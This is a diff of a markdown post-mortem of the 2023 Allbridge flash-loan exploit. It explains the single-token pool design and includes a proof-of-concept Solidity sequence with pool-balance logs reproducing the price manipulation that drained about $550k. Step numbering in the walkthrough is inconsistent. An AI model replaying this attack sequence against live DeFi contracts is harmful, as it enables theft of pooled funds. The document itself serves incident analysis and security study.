@@ -1,12 +1,13 @@
 # Allbridge
 
+![Swag Image](https://static.vecteezy.com/system/resources/thumbnails/009/665/324/small/cute-kitty-cat-on-train-cartoon-element-free-png.png)
+
 
 ## What's Allbridge?
 Allbridge is a leading cross-chain provider, specializing in integrating EVM with non-EVM blockchains.
 Their mission is to make the blockchain world borderless by providing an 
 infrastructure to freely move assets between various networks
 
-![Swag Image](../images/swag2.drawio.png)
 
 ## Amount stolen
 $550k USD
@@ -14,36 +15,25 @@ $550k USD
 2-04-2023
 
 ## Vulnerability
-flashloan attack
+Flashloan attack
 
 
 ## Analysis
 The root cause appears to be the manipulation of the pool's swap price.
 The attacker was able to act as the liquidity prover and swapper resulting the user to manipulate the price and drain funds from the pool
 
+Each Allbridge Core liquidity pool is essentially a swap contract, 
+similar to the existing decentralized exchanges like Uniswap or Curve Finance.
+What is different about Allbrige's pools, though, is the fact that liquidity is provided in just one token (unlike the regular DEXes, which require two tokens).
+
+When liquidity is deposited, it matches the deposited amount by minting the same amount of vUSD tokens*. This token is used as an intermediary to transfer value from one pool to another (either within the same blockchain or between two different blockchains).
+
+*vUSD token is an abstraction used within the Allbridge Core ecosystem. Technically it is not a token, as it never gets out to user balances as an actual token. However, it is easier to explain the concept of how Allbridge Core works using this “token” analogy.
+
+To illustrate, consider bridging BUSD from the BNB Chain to USDT on Tron. The process involves swapping BUSD for vUSD, transferring the vUSD value to Tron through a cross-chain messaging protocol, and ultimately swapping vUSD for USDT on Tron. Notably, this directional swap results in a decrease in the internal price of BUSD to vUSD, while the price of USDT to vUSD increases. This dynamic encourages other participants to bridge assets in the opposite direction, seeking profitable opportunities within the Allbridge Core ecosystem.
 
 
-## exploited code
-
-```solidity
-
-  function withdraw(uint256 amountLp) external {
-    uint 256 totalLpAmount_ = totalLpAmount; // Gas optimization
-
-    _withdrawLp(msg.sender, amountLp);
-
-    // Calculate actual and virtual tokens using burned LP amount share
-    // Swap the difference, get total amount to transfer/burn
-    uint256 amountSP = _preWithdrawSwap(
-       tokenBalance * amountLp / totalLpAmount_,
-       vUsdBalance * amountLp / totalLpAmount_
-    );
-
-    // Always equal amounts removed from actual and virtual tokens
- 
-```
-
-## whats a pool?
+## what's a pool?
 
 Liquidity pools allow users to trade digital assets on decentralized exchanges 
 within the decentralized finance (DeFi) ecosystem,
@@ -57,105 +47,110 @@ pool to create a market, which is similar to trading pairs on traditional exchan
 Market participants that provide liquidity (contribute crypto assets) to a liquidity pool will earn trading fees as 
 a reward for the trades executed within the pool. 
 
+
+
 # proof of concept (PoC) 
 
-
- - We start with a flashloan $7.5M of BUSD `pancakeSwap.swap(0, 7_500_000e18, address(this), "Test");`
-
-
-During that flashloan we execute the following:
-
- - 2 million of 7.5 will be swapped for $2M of $BSC-USD in pool_0x312B
-```solidity
-        BUSD.approve(address(pool_0x312B), type(uint256).max);
-        BSC_USD.approve(address(pool_0x312B), type(uint256).max);
-        pool_0x312B.swap(address(BUSD), address(BSC_USD), 2_003_300e18, 1, address(this), block.timestamp + 100 seconds);
-```
+![Swag Image](../images/allbridge.png)
 
 
-Then deposits $5M BUSD into pool 0x179a
+During the flashloan, the following steps are executed:
 
-```solidity
-        BUSD.approve(address(pool_0x179a), type(uint256).max);
-        pool_0x179a.deposit(5_000_000e18);
-```
+1. **Swap for USDT:**
+   - Swap 2 million BUSD for $2M USDT.
 
-Swap BUSD to BSC_USD
+2. **Deposit into BUSD Pool:**
+   - Deposit $5M BUSD into the BUSD pool using the `deposit` function.
 
-```solidity
-          pool_0x312B.swap(address(BUSD), address(BSC_USD), 496_700e18, 1, address(this), block.timestamp + 100 seconds);
-```
+3. **Swap BUSD for USDT:**
+   - Swap 500k BUSD for USDT.
 
-Deposit $2 mil into pool_0xb19c
+4. **Deposit into USDT Pool:**
+   - Deposit $2M USDT into the USDT pool.
+  
+`BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate: 5322629245 5306461333 1`
 
-```solidity
-        BSC_USD.approve(address(pool_0xb19c), type(uint256).max);
-        pool_0xb19c.deposit(2_000_000e18);
-```
-
-The attacker then swaps $500K BSC-USD for $BUSD 
-        in Allbridge's Bridge contract, resulting in a high 
-        dividend for the previous liquidity deposit.
+5. **Bridge Swap:**
+   - Use the bridge to swap 500k USDT for 500k BUSD, resulting in a high dividend for the previous liquidity deposit.
+  
+`BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate: 4831042788 5799131323 1`
 
 
-
-```solidity
-   bytes32 bsc_usd = 0x00000000000000000000000055d398326f99059ff775485246999027b3197955;
-        bytes32 busd = 0x000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d56;
-
-        uint256 BSC_USD_bal = BSC_USD.balanceOf(address(this));
-        bridge.swap(BSC_USD_bal, bsc_usd, busd, address(this));
-```
-
-   The BUSD liquidity in 0x179a is then removed, 
-        at which point the liquidity balance within 
-        the 0x179a pool is broken.
-
-```solidity
-          pool_0x179a.withdraw(4_830_262_616);
-```
- 
-  The attacker was then able to swap out $790,000 
-        of BSC-USD from Bridge using only $40,000 of BUSD.
-        
-
-```solidity
-           bridge.swap(40_000e18, busd, bsc_usd, address(this));
-```
-
-Withdraw from pool_0xb19c
- 
-```solidity
-        pool_0xb19c.withdraw(1_993_728_530);
-```
+7. **Withdraw from BUSD Pool:**
+   - Withdraw $5M BUSD from the BUSD pool.
+  
+`BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate: 43730 968132265 22138`
 
 
-Swap BSC_USD to BUSD in pool_0x312B
+8. **Bridge Swap for Profit:**
+   - Use the bridge to swap 40k BUSD for 790k USDT, exploiting the artificial pool imbalance.
+  
+`BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate: 39983730 178738726 4`
 
-```solidity
-        BSC_USD_bal = BSC_USD.balanceOf(address(this));
-        pool_0x312B.swap(address(BSC_USD), address(BUSD), BSC_USD_bal, 1, address(this), block.timestamp + 100 seconds);
-```
+10. **Withdraw from USDT Pool:**
+   - Withdraw $2M USDT from the USDT pool.
+
+11. **Swap USDT for BUSD:**
+   - Swap all USDT for BUSD.
+
+11. **Repay Flashloan:**
+    - Repay the flashloan using the repaid funds.
+
+12. **Transfer Funds:**
+    - Transfer the remaining funds to the attacker's account.
+   
+`Attacker BUSD balance after exploit: 549889.574365192879687841`
 
 
-Repay flashloan
-
-
- ```solidity
-        BUSD.transfer(address(pancakeSwap), 7_522_500e18);
-```
-
-Transfer loot to attacker
+This sequence of actions exploits the liquidity pools, taking advantage of imbalances to maximize gains and navigate the cross-chain swaps.
 
 
 ```solidity
-        BUSD.transfer(tx.origin, BUSD.balanceOf(address(this)));
+      Swap.swap(address(BUSD), address(USDT), 2_003_300 * 1e18, 1, address(this), block.timestamp);
+        BUSDPool.deposit(5_000_000 * 1e18); // deposit BUSD to BUSDPool
+        Swap.swap(address(BUSD), address(USDT), 496_700 * 1e18, 1, address(this), block.timestamp);
+        USDTPool.deposit(2_000_000 * 1e18); // deposit USDT to USDTPool
+
+        console.log(
+            "BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate:",
+            BUSDPool.tokenBalance(),
+            BUSDPool.vUsdBalance(),
+            BUSDPool.tokenBalance() / BUSDPool.vUsdBalance()
+        );
+        bytes32 token = bytes32(uint256(uint160(address(USDT))));
+        bytes32 receiveToken = bytes32(uint256(uint160(address(BUSD))));
+        BridgeSwap.swap(USDT.balanceOf(address(this)), token, receiveToken, address(this)); // BridgeSwap USDT to BUSD
+        console.log(
+            "BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:",
+            BUSDPool.tokenBalance(),
+            BUSDPool.vUsdBalance(),
+            BUSDPool.vUsdBalance() / BUSDPool.tokenBalance()
+        );
+
+        BUSDPool.withdraw(4_830_262_616); // Amplify the imbalance of vUSDbalance and tokenbalance in BUSDPool
+        console.log(
+            "BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:",
+            BUSDPool.tokenBalance(),
+            BUSDPool.vUsdBalance(),
+            BUSDPool.vUsdBalance() / BUSDPool.tokenBalance()
+        );
+
+        BridgeSwap.swap(40_000 * 1e18, receiveToken, token, address(this)); // BridgeSwap BUSD to USDT
+        console.log(
+            "BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:",
+            BUSDPool.tokenBalance(),
+            BUSDPool.vUsdBalance(),
+            BUSDPool.vUsdBalance() / BUSDPool.tokenBalance()
+        );
+        USDTPool.withdraw(1_993_728_530);
+
+        Swap.swap(address(USDT), address(BUSD), USDT.balanceOf(address(this)), 1, address(this), block.timestamp);
+        BUSD.transfer(address(Pair), 7_522_500 * 1e18);
 ```
 
+## One asset per chain
 
-```solidity
-    console.log("hacker BUSD bal after attack is        ", BUSD.balanceOf(tx.origin));
-```
+To prevent the possibility of flash loan attacks, we will deploy a single liquidity pool per blockchain. Therefore, it will not be possible to execute an exploit in a single transaction. We may potentially return to the concept of multiple assets in the future once more extensive audits of our code are completed. But for now, we’re staying on the safe side.
 
 ## Mitigation and Best Practices:
 
